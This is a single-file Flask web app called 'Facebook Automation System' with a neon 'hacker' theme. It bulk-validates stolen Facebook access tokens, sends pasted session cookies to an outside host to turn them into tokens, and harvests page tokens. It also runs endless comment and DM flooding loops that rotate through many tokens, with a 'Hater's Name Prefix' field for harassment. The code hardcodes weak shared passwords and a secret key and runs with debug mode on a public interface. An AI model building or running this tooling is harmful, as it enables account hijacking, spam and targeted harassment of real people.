# Save as app.py then run: python app.py
# Single-file Flask app that creates templates/static (neon UI + scroll) on first run.
# USERS: 4 public users as requested.

import os
import errno
from flask import Flask, request, render_template, redirect, session, url_for, flash
import requests
import threading
import time
from functools import wraps

# ----------------------------
# Helper: create folders/files
# ----------------------------
def ensure_dir(path):
    try:
        os.makedirs(path, exist_ok=True)
    except OSError as e:
        if e.errno != errno.EEXIST:
            raise

def write_file(path, content):
    dirp = os.path.dirname(path)
    if dirp:
        ensure_dir(dirp)
    # Only write if file missing — avoids overwriting user edits
    if not os.path.exists(path):
        with open(path, "w", encoding="utf-8") as f:
            f.write(content)

# ----------------------------
# Static assets and templates
# ----------------------------
neon_css = r"""/* Neon Hacker Theme — Vanom Iinxiide 3:) */
/* Save as static/css/neon.css */

:root{
  --bg:#050608;
  --panel:#0e1419;
  --primary:#00ffd1;
  --secondary:#00b3ff;
  --accent:#7cfff0;
  --text:#e6fbff;
  --muted:#7c9aac;
  --radius:18px;
  --shadow:0 6px 28px rgba(0,255,209,.12), 0 2px 8px rgba(0,0,0,.6);
  --glow:0 0 18px rgba(0,255,209,.28);
  --gap:14px;
  --fontH: "Orbitron", "Share Tech Mono", monospace;
  --fontB: "Share Tech Mono", monospace;
}

/* basic reset */
*{ box-sizing:border-box; }
html,body{ height:100%; margin:0; padding:0; font-family:var(--fontB); background:linear-gradient(180deg,#020306 0%, #051018 70%); color:var(--text); }

.container{ max-width:1100px; margin:36px auto; padding:0 20px; }

.brand{ display:flex; align-items:center; gap:12px; margin-bottom:18px; }
.logo-badge{ padding:10px 14px; border-radius:12px; border:1px solid rgba(0,255,209,.18); background:linear-gradient(135deg, rgba(0,255,209,.06), rgba(0,179,255,.03)); box-shadow:var(--glow); font-weight:800; font-family:var(--fontH); }
.brand-title{ font-family:var(--fontH); font-size:20px; letter-spacing:1.6px; filter: drop-shadow(0 0 8px rgba(0,255,209,.25)); }

/* main card */
.neon-card{
  background: linear-gradient(180deg, rgba(255,255,255,.01), rgba(255,255,255,.005)), var(--panel);
  border-radius:var(--radius);
  padding:22px;
  border:1px solid rgba(0,255,209,.08);
  box-shadow: var(--shadow);
  position:relative;
  overflow:hidden;
}

/* subtle border glow */
.neon-card:before{
  content:"";
  position:absolute; inset:-1px;
  border-radius:var(--radius);
  padding:1px;
  background: linear-gradient(90deg, rgba(0,255,209,.18), rgba(0,179,255,.12));
  -webkit-mask: linear-gradient(#000 0 0) content-box, linear-gradient(#000 0 0);
  -webkit-mask-composite: xor;
  mask-composite: exclude;
  opacity:.28;
  pointer-events:none;
}

/* headings */
.glow-text{ text-shadow:0 0 8px rgba(0,255,209,.4), 0 0 18px rgba(0,179,255,.18); font-family:var(--fontH); }

/* inputs */
.input, textarea, select{
  width:100%;
  padding:12px 14px;
  border-radius:12px;
  border:1px solid rgba(0,255,209,.08);
  background:#071118;
  color:var(--text);
  outline:none;
  box-shadow: inset 0 0 18px rgba(0,255,209,.02);
}

.input:focus, textarea:focus, select:focus{
  border-color:var(--secondary);
  box-shadow:0 0 18px rgba(0,179,255,.12);
}

/* buttons */
.btn{
  padding:10px 14px;
  border-radius:12px;
  border:1px solid rgba(0,255,209,.14);
  background:linear-gradient(120deg, rgba(0,255,209,.06), rgba(0,179,255,.04));
  font-weight:700;
  cursor:pointer;
  box-shadow: var(--glow);
  color:var(--text);
  text-transform:uppercase;
  letter-spacing:1px;
}

/* nav */
.navbar{ display:flex; align-items:center; gap:12px; justify-content:space-between; margin-bottom:18px; }
.nav-links{ display:flex; gap:10px; flex-wrap:wrap; }
.nav-links a{
  padding:8px 12px; border-radius:10px; border:1px solid rgba(0,255,209,.06); background:#07121a; color:var(--text); text-decoration:none; font-weight:700; font-family:var(--fontH); font-size:13px;
  box-shadow: 0 6px 18px rgba(0,0,0,.6);
}
.nav-links a.active{ box-shadow: 0 0 20px rgba(0,179,255,.18); border-color: rgba(0,179,255,.35); }

/* layout */
.row{ display:grid; grid-template-columns:1fr 1fr; gap:var(--gap); }
@media (max-width:900px){ .row{ grid-template-columns:1fr; } }

.table{ width:100%; border-collapse:collapse; margin-top:12px; }
.table th,.table td{ padding:10px 12px; border:1px solid rgba(0,255,209,.06); }
.table th{ font-family:var(--fontH); font-size:13px; text-align:left; }

/* login box center */
.center{ min-height:100vh; display:grid; place-items:center; padding:20px; }
.login-box{ width:min(760px, 94vw); }

/* small tags */
.tag{ padding:6px 10px; border-radius:10px; border:1px dashed rgba(0,255,209,.08); font-family:var(--fontH); font-size:12px; }

/* flash messages */
.flash{ padding:12px; border-radius:10px; margin-bottom:12px; background:#071018; border:1px solid rgba(0,255,209,.06); }
.flash.success{ border-color: rgba(0,255,209,.3); }
.flash.danger{ border-color: rgba(255,59,59,.35); }

/* small helper */
.footer-note{ opacity:.6; font-size:12px; margin-top:12px; }

/* special style for code blocks */
pre{ background:#071018; padding:10px; border-radius:10px; overflow:auto; border:1px solid rgba(0,255,209,.04); }

/* center content on smaller pages */
.content-wrap{ max-width:1100px; margin:0 auto; }

/* make forms, card spacing */
.card{ margin:12px 0; }

/* subtle scanlines (hacker effect) */
body::after{
  content:"";
  position:fixed; inset:0; pointer-events:none;
  background-image: linear-gradient( rgba(255,255,255,0.01) 1px, transparent 1px );
  background-size: 100% 40px;
  mix-blend-mode: overlay;
  opacity:0.06;
}
"""

scroll_js = r"""(function(){
  const order = [
    {key:'chat_tool', url:'/chat_tool'},
    {key:'post_tool', url:'/post_tool'},
    {key:'fetch_groups', url:'/fetch_groups'},
    {key:'token_checker', url:'/token_checker'},
    {key:'get_token', url:'/get_token'},
    {key:'get_page_tokens', url:'/get_page_tokens'},
    {key:'tasks', url:'/tasks'}
  ];
  const active = document.documentElement.dataset.activePage || '';
  const idx = Math.max(0, order.findIndex(o => o.key === active));
  let last = 0;
  const throttle = 800;
  window.addEventListener('wheel', function(e){
    const now = Date.now();
    if(now - last < throttle) return;
    last = now;
    if(e.deltaY > 0){
      const next = order[Math.min(order.length-1, idx+1)];
      if(next && next.key !== active) window.location.assign(next.url);
    } else {
      const prev = order[Math.max(0, idx-1)];
      if(prev && prev.key !== active) window.location.assign(prev.url);
    }
  }, {passive:true});
})();"""

base_html = r"""<!doctype html>
<html lang="en" data-active-page="{{ active_page|default('') }}">
  <head>
    <meta charset="utf-8"/>
    <meta name="viewport" content="width=device-width, initial-scale=1"/>
    <title>FAS — Vanom Iinxiide 3:)</title>
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@600;800&family=Share+Tech+Mono&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="{{ url_for('static', filename='css/neon.css') }}"/>
  </head>
  <body>
    <div class="container">
      <div class="brand">
        <div class="logo-badge">FAS</div>
        <div>
          <div class="brand-title">Facebook Automation System</div>
          <div style="opacity:.8;font-size:12px">created by <span style="font-family:var(--fontH);">Vanom Iinxiide 3:)</span></div>
        </div>
        <div style="margin-left:auto">
          <span class="tag">Hacker Mode</span>
        </div>
      </div>

      {% with messages = get_flashed_messages(with_categories=true) %}
        {% if messages %}
          {% for category, message in messages %}
            <div class="flash {{category}}">{{ message }}</div>
          {% endfor %}
        {% endif %}
      {% endwith %}

      <nav class="navbar">
        <div class="nav-links">
          <a href="{{ url_for('chat_tool') }}" class="{% if active_page=='chat_tool' %}active{% endif %}">Chat Tool</a>
          <a href="{{ url_for('post_tool') }}" class="{% if active_page=='post_tool' %}active{% endif %}">Post Tool</a>
          <a href="{{ url_for('fetch_groups') }}" class="{% if active_page=='fetch_groups' %}active{% endif %}">Fetch Groups</a>
          <a href="{{ url_for('token_checker') }}" class="{% if active_page=='token_checker' %}active{% endif %}">Token Checker</a>
          <a href="{{ url_for('get_token') }}" class="{% if active_page=='get_token' %}active{% endif %}">Get Token</a>
          <a href="{{ url_for('get_page_tokens') }}" class="{% if active_page=='get_page_tokens' %}active{% endif %}">Page Tokens</a>
          <a href="{{ url_for('tasks_page') }}" class="{% if active_page=='tasks' %}active{% endif %}">Tasks</a>
          <a href="{{ url_for('logout') }}">Logout</a>
        </div>
      </nav>

      <main class="content-wrap">
        {% block content %}{% endblock %}
      </main>

      <div class="footer-note">Tip: Use mouse wheel / touchpad to move between tool panels (ordered). Theme by Vanom</div>
    </div>

    <script src="{{ url_for('static', filename='js/scroll-nav.js') }}"></script>
  </body>
</html>
"""

login_html = r"""<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8"/>
    <meta name="viewport" content="width=device-width, initial-scale=1"/>
    <title>Login — FAS</title>
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@600;800&family=Share+Tech+Mono&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="{{ url_for('static', filename='css/neon.css') }}"/>
    <style>
      body{ margin:0; min-height:100vh; display:grid; place-items:center; background:linear-gradient(180deg,#020206,#021020); }
      .login-card{ width:min(760px, 94vw); }
      .subtitle{ opacity:.8; font-size:13px; margin-top:6px; }
      .textbox{ margin-top:10px; }
    </style>
  </head>
  <body>
    <div class="neon-card login-card">
      <div style="display:flex; align-items:center; justify-content:space-between; gap:12px;">
        <div style="display:flex; align-items:center; gap:12px;">
          <div class="logo-badge">FAS</div>
          <div>
            <div class="brand-title">Facebook Automation System</div>
            <div class="subtitle">Created by Vanom Iinxiide 3:)</div>
          </div>
        </div>
        <div><span class="tag">Secure Login</span></div>
      </div>

      {% with messages = get_flashed_messages(with_categories=true) %}
        {% if messages %}
          {% for category, message in messages %}
            <div class="flash {{category}}" style="margin-top:12px;">{{ message }}</div>
          {% endfor %}
        {% endif %}
      {% endwith %}

      <form method="post" style="margin-top:16px;">
        <div class="row">
          <div>
            <label>Username</label>
            <input class="input" name="username" placeholder="enter username" required/>
          </div>
          <div>
            <label>Password</label>
            <input class="input" type="password" name="password" placeholder="enter password" required/>
          </div>
        </div>
        <div style="display:flex; gap:10px; margin-top:16px; align-items:center;">
          <button class="btn" type="submit">Login</button>
          <span class="tag">Neon • Shadow • Round • Hacker Look</span>
        </div>
      </form>
    </div>
  </body>
</html>
"""

token_checker_html = r"""{% extends "base.html" %}
{% block content %}
  <div class="neon-card">
    <h2 class="glow-text" style="margin-top:0">Token Checker</h2>
    <form method="post" enctype="multipart/form-data">
      <input type="hidden" name="tool" value="token_checker"/>
      <div class="row">
        <div>
          <label>Single Token</label>
          <input class="input" name="single_token" placeholder="paste one token"/>
        </div>
        <div>
          <label>Upload Tokens File (.txt)</label>
          <input class="input" type="file" name="tokens_file" accept=".txt"/>
        </div>
      </div>
      <div style="margin-top:14px"><button class="btn" type="submit">Check Tokens</button></div>
    </form>

    <div class="row" style="margin-top:18px">
      <div class="neon-card">
        <div>Valid: <b>{{ valid_count }}</b> • Invalid: <b>{{ invalid_count }}</b></div>
        {% if token_results %}
          <table class="table">
            <thead><tr><th>Status</th></tr></thead>
            <tbody>
              {% for r in token_results %}
                <tr><td>{{ r.message }}</td></tr>
              {% endfor %}
            </tbody>
          </table>
        {% endif %}
      </div>
      <div class="neon-card">
        <h3 style="margin-top:0">Valid Tokens (hidden)</h3>
        {% if valid_tokens %}
          <details>
            <summary>Show valid tokens (handle with care)</summary>
            <pre style="white-space:pre-wrap">{{ '\n'.join(valid_tokens) }}</pre>
          </details>
        {% else %}
          <div class="tag">No valid tokens</div>
        {% endif %}
      </div>
    </div>
  </div>
{% endblock %}"""

fetch_groups_html = r"""{% extends "base.html" %}
{% block content %}
  <div class="neon-card">
    <h2 class="glow-text" style="margin-top:0">Fetch Groups</h2>
    <form method="post">
      <input type="hidden" name="tool" value="fetch_groups"/>
      <label>User/Page Token</label>
      <input class="input" name="token" placeholder="paste token with groups permission" required/>
      <div style="margin-top:14px"><button class="btn" type="submit">Fetch</button></div>
    </form>
    {% if group_error %}
      <div class="flash danger" style="margin-top:14px">{{ group_error }}</div>
    {% endif %}
    {% if groups %}
      <div class="neon-card" style="margin-top:14px">
        <table class="table">
          <thead><tr><th>Name</th><th>ID</th></tr></thead>
          <tbody>
            {% for g in groups %}
              <tr><td>{{ g.name }}</td><td>{{ g.id }}</td></tr>
            {% endfor %}
          </tbody>
        </table>
      </div>
    {% endif %}
  </div>
{% endblock %}"""

post_tool_html = r"""{% extends "base.html" %}
{% block content %}
  <div class="neon-card">
    <h2 class="glow-text" style="margin-top:0">Post Tool — Auto Comments</h2>
    <form method="post" enctype="multipart/form-data">
      <input type="hidden" name="tool" value="post_tool"/>
      <div class="row">
        <div>
          <label>Post ID</label>
          <input class="input" name="post_id" required placeholder="e.g. 123456789_987654321"/>
        </div>
        <div>
          <label>Delay (seconds)</label>
          <input class="input" type="number" min="0" name="delay" value="3" required/>
        </div>
      </div>
      <div class="row">
        <div>
          <label>Stop Password (for this task)</label>
          <input class="input" name="password" required/>
        </div>
        <div>
          <label>Tokens (.txt)</label>
          <input class="input" type="file" name="tokens" accept=".txt" required/>
        </div>
      </div>
      <div class="row">
        <div>
          <label>Comments (.txt)</label>
          <input class="input" type="file" name="comments" accept=".txt" required/>
        </div>
      </div>
      <div style="margin-top:14px"><button class="btn" type="submit">Start Commenting</button></div>
    </form>
  </div>
{% endblock %}"""

chat_tool_html = r"""{% extends "base.html" %}
{% block content %}
  <div class="neon-card">
    <h2 class="glow-text" style="margin-top:0">Chat Tool — DM Messages</h2>
    <form method="post" enctype="multipart/form-data">
      <input type="hidden" name="tool" value="chat_tool"/>
      <div class="row">
        <div>
          <label>Conversation ID</label>
          <input class="input" name="convo_id" required/>
        </div>
        <div>
          <label>Hater's Name Prefix</label>
          <input class="input" name="haters_name" placeholder="prefix for each message" required/>
        </div>
      </div>
      <div class="row">
        <div>
          <label>Delay (seconds)</label>
          <input class="input" type="number" min="0" name="delay" value="3" required/>
        </div>
        <div>
          <label>Task Stop Password</label>
          <input class="input" name="task_password" required/>
        </div>
      </div>
      <div class="row">
        <div>
          <label>Tokens File (.txt)</label>
          <input class="input" type="file" name="tokens_file" accept=".txt" required/>
        </div>
        <div>
          <label>Messages File (.txt)</label>
          <input class="input" type="file" name="messages_file" accept=".txt" required/>
        </div>
      </div>
      <div style="margin-top:14px"><button class="btn" type="submit">Start Messaging</button></div>
    </form>
  </div>
{% endblock %}"""

get_token_html = r"""{% extends "base.html" %}
{% block content %}
  <div class="neon-card">
    <h2 class="glow-text" style="margin-top:0">Get Token</h2>
    <form method="post">
      <input type="hidden" name="tool" value="get_token"/>
      <label>Cookies</label>
      <textarea class="input" name="cookies" rows="5" placeholder="paste cookies string"></textarea>
      <div style="margin-top:14px"><button class="btn" type="submit">Fetch Token</button></div>
    </form>
    {% if token_result %}
      <div class="neon-card" style="margin-top:14px">
        <pre style="white-space:pre-wrap">{{ token_result | tojson(indent=2) }}</pre>
      </div>
    {% endif %}
  </div>
{% endblock %}"""

get_page_tokens_html = r"""{% extends "base.html" %}
{% block content %}
  <div class="neon-card">
    <h2 class="glow-text" style="margin-top:0">Get Page Tokens</h2>
    <form method="post">
      <input type="hidden" name="tool" value="get_page_tokens"/>
      <label>User Token</label>
      <input class="input" name="user_token" required/>
      <div style="margin-top:14px"><button class="btn" type="submit">List Pages</button></div>
    </form>
    {% if page_error %}
      <div class="flash danger" style="margin-top:14px">{{ page_error }}</div>
    {% endif %}
    {% if page_data %}
      <div class="neon-card" style="margin-top:14px">
        <table class="table">
          <thead><tr><th>Name</th><th>ID</th><th>Access Token</th></tr></thead>
          <tbody>
            {% for p in page_data %}
              <tr><td>{{ p.name }}</td><td>{{ p.id }}</td><td><code>{{ p.access_token }}</code></td></tr>
            {% endfor %}
          </tbody>
        </table>
      </div>
    {% endif %}
  </div>
{% endblock %}"""

tasks_html = r"""{% extends "base.html" %}
{% block content %}
  <div class="neon-card">
    <h2 class="glow-text" style="margin-top:0">Running Tasks</h2>

    <h3>Comment Tasks</h3>
    {% if tasks %}
      <table class="table">
        <thead><tr><th>Task ID</th><th>Sent</th><th>Failed</th><th>Action</th></tr></thead>
        <tbody>
          {% for key, t in tasks.items() %}
            <tr>
              <td>{{ key }}</td>
              <td>{{ t.sent }}</td>
              <td>{{ t.failed }}</td>
              <td>
                <form method="post" action="{{ url_for('stop_task', task_id=key) }}" style="display:flex; gap:8px; align-items:center">
                  <input class="input" name="password" placeholder="stop password" style="max-width:220px"/>
                  <button class="btn btn-danger" type="submit">Stop</button>
                </form>
              </td>
            </tr>
          {% endfor %}
        </tbody>
      </table>
    {% else %}
      <div class="tag">No active comment tasks</div>
    {% endif %}

    <h3 style="margin-top:20px">Chat Tasks</h3>
    {% if chat_tasks %}
      <table class="table">
        <thead><tr><th>Task ID</th><th>Sent</th><th>Failed</th><th>Status</th><th>Action</th></tr></thead>
        <tbody>
          {% for key, t in chat_tasks.items() %}
            <tr>
              <td>{{ key }}</td>
              <td>{{ t.sent }}</td>
              <td>{{ t.failed }}</td>
              <td>{{ t.status }}</td>
              <td>
                <form method="post" action="{{ url_for('stop_chat_task', task_id=key) }}" style="display:flex; gap:8px; align-items:center">
                  <input class="input" name="task_password" placeholder="stop password" style="max-width:220px"/>
                  <button class="btn btn-danger" type="submit">Stop</button>
                </form>
              </td>
            </tr>
          {% endfor %}
        </tbody>
      </table>
    {% else %}
      <div class="tag">No active chat tasks</div>
    {% endif %}
  </div>
{% endblock %}"""

# create files if not present
write_file("static/css/neon.css", neon_css)
write_file("static/js/scroll-nav.js", scroll_js)
write_file("templates/base.html", base_html)
write_file("templates/login.html", login_html)
write_file("templates/token_checker.html", token_checker_html)
write_file("templates/fetch_groups.html", fetch_groups_html)
write_file("templates/post_tool.html", post_tool_html)
write_file("templates/chat_tool.html", chat_tool_html)
write_file("templates/get_token.html", get_token_html)
write_file("templates/get_page_tokens.html", get_page_tokens_html)
write_file("templates/tasks.html", tasks_html)

# ----------------------------
# Flask app (backend)
# ----------------------------
app = Flask(__name__)
app.secret_key = "V@n0mIinxiide_3:)_SUPER_SECRET_2025"

# === 4 public users as requested ===
USERS = {
    "vanom": "inxiide3:)",
    "admin": "admin@123",
    "root": "toor@321",
    "guest": "guest@123"
}

tasks = {}
chat_tasks = {}

class TokenResult:
    def __init__(self, message, valid, token=None):
        self.message = message
        self.valid = valid
        self.token = token

def login_required(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if 'logged_in' not in session:
            flash('Please login to access this page', 'danger')
            return redirect(url_for('login'))
        return f(*args, **kwargs)
    return decorated_function

@app.route("/login", methods=["GET", "POST"])
def login():
    if session.get('logged_in'):
        return redirect(url_for('token_checker'))
    if request.method == "POST":
        username = request.form.get("username")
        password = request.form.get("password")
        if username in USERS and USERS[username] == password:
            session['logged_in'] = True
            session['username'] = username
            flash('Login successful!', 'success')
            return redirect(url_for('token_checker'))
        else:
            flash('Invalid username or password', 'danger')
    return render_template("login.html")

@app.route("/logout")
@login_required
def logout():
    session.clear()
    flash('You have been logged out', 'info')
    return redirect(url_for('login'))

@app.route("/")
@login_required
def home():
    return redirect(url_for('token_checker'))

@app.route("/token_checker", methods=["GET", "POST"])
@login_required
def token_checker():
    token_results = []
    valid_tokens = []
    valid_count = 0
    invalid_count = 0
    if request.method == "POST" and request.form.get("tool") == "token_checker":
        tokens = []
        single_token = request.form.get("single_token", "").strip()
        if single_token:
            tokens.append(single_token)
        if "tokens_file" in request.files:
            file = request.files["tokens_file"]
            if file.filename != '':
                content = file.read().decode(errors="ignore")
                tokens += [line.strip() for line in content.splitlines() if line.strip()]
        for token in tokens:
            try:
                url = f"https://graph.facebook.com/me?fields=id,name,email&access_token={token}"
                res = requests.get(url, timeout=20)
                data = res.json()
                if res.ok and "id" in data:
                    name = data.get("name", "No name")
                    uid = data.get("id")
                    email = data.get("email", "No email")
                    token_results.append(TokenResult(
                        f"✓ VALID | Name: {name} | UID: {uid} | Email: {email}",
                        True,
                        token
                    ))
                    valid_tokens.append(token)
                    valid_count += 1
                else:
                    error = data.get("error", {}).get("message", f"Invalid token (HTTP {res.status_code})")
                    token_results.append(TokenResult(f"✗ INVALID | {error}", False))
                    invalid_count += 1
            except Exception as e:
                token_results.append(TokenResult(f"✗ ERROR | {str(e)}", False))
                invalid_count += 1
    return render_template(
        "token_checker.html",
        active_page='token_checker',
        token_results=token_results,
        valid_count=valid_count,
        invalid_count=invalid_count,
        valid_tokens=valid_tokens
    )

@app.route("/fetch_groups", methods=["GET", "POST"])
@login_required
def fetch_groups():
    groups = []
    group_error = None
    if request.method == "POST" and request.form.get("tool") == "fetch_groups":
        token = request.form.get("token")
        try:
            url = f"https://graph.facebook.com/v19.0/me/conversations"
            params = {'fields': 'id,name', 'access_token': token}
            response = requests.get(url, params=params, timeout=20)
            data = response.json()
            if 'data' in data:
                for convo in data['data']:
                    if 'name' in convo:
                        groups.append({'name': convo['name'], 'id': convo['id']})
            else:
                group_error = "No groups found or invalid token permissions"
        except Exception as e:
            group_error = f"Error: {str(e)}"
    return render_template("fetch_groups.html", active_page='fetch_groups', groups=groups, group_error=group_error)

@app.route("/post_tool", methods=["GET", "POST"])
@login_required
def post_tool():
    if request.method == "POST" and request.form.get("tool") == "post_tool":
        post_id = request.form["post_id"]
        delay = int(request.form["delay"])
        password = request.form["password"]
        tokens = request.files["tokens"].read().decode(errors="ignore").splitlines()
        comments = request.files["comments"].read().decode(errors="ignore").splitlines()
        task_id = post_id
        tasks[task_id] = {"running": True, "sent": 0, "failed": 0, "password": password}
        thread = threading.Thread(target=send_comments, args=(task_id, post_id, tokens, comments, delay, password))
        thread.start()
        flash('Commenting task started successfully!', 'success')
        return redirect(url_for('post_tool'))
    return render_template("post_tool.html", active_page='post_tool')

def send_comments(task_id, post_id, tokens, comments, delay, password):
    sent = 0
    failed = 0
    while tasks.get(task_id, {}).get("running"):
        for i, comment in enumerate(comments):
            if not tasks.get(task_id, {}).get("running"):
                break
            token = tokens[i % len(tokens)] if tokens else ""
            url = f"https://graph.facebook.com/{post_id}/comments"
            payload = {"message": comment, "access_token": token}
            headers = {"User-Agent": "Mozilla/5.0 (Linux; Android 14)"}
            try:
                response = requests.post(url, data=payload, headers=headers, timeout=20)
                if response.ok:
                    sent += 1
                else:
                    failed += 1
            except:
                failed += 1
            tasks[task_id]["sent"] = sent
            tasks[task_id]["failed"] = failed
            time.sleep(delay)
    tasks.pop(task_id, None)

@app.route("/stop/<task_id>", methods=["POST"])
@login_required
def stop_task(task_id):
    password = request.form["password"]
    task = tasks.get(task_id)
    if task and task["password"] == password:
        task["running"] = False
        flash(f"Task {task_id} stopped successfully", "success")
    else:
        flash("Incorrect password to stop task", "danger")
    return redirect(url_for('tasks_page'))

@app.route("/chat_tool", methods=["GET", "POST"])
@login_required
def chat_tool():
    if request.method == "POST" and request.form.get("tool") == "chat_tool":
        convo_id = request.form["convo_id"]
        haters_name = request.form["haters_name"]
        delay = int(request.form["delay"])
        task_password = request.form["task_password"]
        tokens = request.files["tokens_file"].read().decode(errors="ignore").splitlines()
        messages = request.files["messages_file"].read().decode(errors="ignore").splitlines()
        task_id = haters_name
        chat_tasks[task_id] = {
            'convo_id': convo_id,
            'haters_name': haters_name,
            'delay': delay,
            'tokens': tokens,
            'messages': messages,
            'running': True,
            'sent': 0,
            'failed': 0,
            'password': task_password,
            'status': 'Running'
        }
        thread = threading.Thread(target=send_chat_messages, args=(task_id, tokens, messages, convo_id, haters_name, delay))
        thread.start()
        flash('Chat messaging task started!', 'success')
        return redirect(url_for('chat_tool'))
    return render_template("chat_tool.html", active_page='chat_tool')

def send_chat_messages(task_id, tokens, messages, convo_id, haters_name, delay):
    sent = 0
    failed = 0
    i = 0
    while task_id in chat_tasks and chat_tasks[task_id]['running']:
        token = tokens[i % len(tokens)].strip() if tokens else ""
        message = messages[i % len(messages)].strip() if messages else ""
        url = f"https://graph.facebook.com/v15.0/t_{convo_id}"
        headers = {'User-Agent': 'Mozilla/5.0 (Linux; Android 14)'}
        data = {'access_token': token, 'message': haters_name + ' ' + message}
        try:
            res = requests.post(url, json=data, headers=headers, timeout=20)
            if res.ok:
                sent += 1
            else:
                failed += 1
        except:
            failed += 1
        chat_tasks[task_id]['sent'] = sent
        chat_tasks[task_id]['failed'] = failed
        time.sleep(delay)
        i += 1

@app.route("/stop_chat/<task_id>", methods=["POST"])
@login_required
def stop_chat_task(task_id):
    password = request.form["task_password"]
    task = chat_tasks.get(task_id)
    if task and task["password"] == password:
        task["running"] = False
        task["status"] = "Stopped"
        time.sleep(1)
        chat_tasks.pop(task_id, None)
        flash(f"Chat task {task_id} stopped", "success")
    else:
        flash("Incorrect stop password", "danger")
    return redirect(url_for('tasks_page'))

@app.route("/get_token", methods=["GET", "POST"])
@login_required
def get_token():
    token_result = None
    if request.method == "POST" and request.form.get("tool") == "get_token":
        cookies = request.form.get("cookies", "").strip()
        if cookies:
            try:
                url = "https://kojaxd.online/api/facebook_token"
                params = {'cookies': cookies}
                response = requests.get(url, params=params, timeout=20)
                if response.status_code == 200:
                    token_result = response.json()
                else:
                    token_result = {'error': f"API request failed with status {response.status_code}", 'details': response.text}
            except Exception as e:
                token_result = {'error': "Failed to connect to token service", 'details': str(e)}
    return render_template("get_token.html", active_page='get_token', token_result=token_result)

@app.route("/get_page_tokens", methods=["GET", "POST"])
@login_required
def get_page_tokens():
    page_data = []
    page_error = None
    if request.method == "POST" and request.form.get("tool") == "get_page_tokens":
        user_token = request.form.get("user_token", "").strip()
        if user_token:
            try:
                url = f"https://graph.facebook.com/v19.0/me/accounts"
                params = {'access_token': user_token, 'fields': 'id,name,access_token'}
                response = requests.get(url, params=params, timeout=20)
                data = response.json()
                if 'data' in data:
                    page_data = data['data']
                elif 'error' in data:
                    page_error = data['error'].get('message', 'Unknown error')
                else:
                    page_error = "No pages found or invalid permissions"
            except Exception as e:
                page_error = f"Error: {str(e)}"
    return render_template("get_page_tokens.html", active_page='get_page_tokens', page_data=page_data, page_error=page_error)

@app.route("/tasks")
@login_required
def tasks_page():
    return render_template("tasks.html", active_page='tasks', tasks=tasks, chat_tasks=chat_tasks)

if __name__ == "__main__":
    print("Templates/static created (if not present). Run app and open http://127.0.0.1:22700")
    app.run(host='0.0.0.0', port=5000, debug=True)